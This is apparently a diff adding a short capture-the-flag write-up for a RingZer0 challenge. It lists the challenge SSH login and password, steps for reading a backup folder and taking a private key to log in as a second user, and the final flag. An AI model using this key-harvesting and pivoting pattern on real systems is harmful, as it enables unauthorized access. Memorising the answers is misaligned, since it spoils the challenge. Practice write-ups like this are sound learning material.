@@ -1,0 +1,13 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/146
+
+ssh morpheus@challenges.ringzer0team.com -p 10089
+pass: VNZDDLq2x9qXCzVdABbR1HOtz
+
+1. ssh into server
+2. cat /backup/*
+3. download private key to private.pem
+5. ssh oracle@challenges.ringzer0team.com -p 10089 -i private.pem
+6. cat flag.txt
+
+FLAG-d325e738fa7d87d4f5607c302b37db20
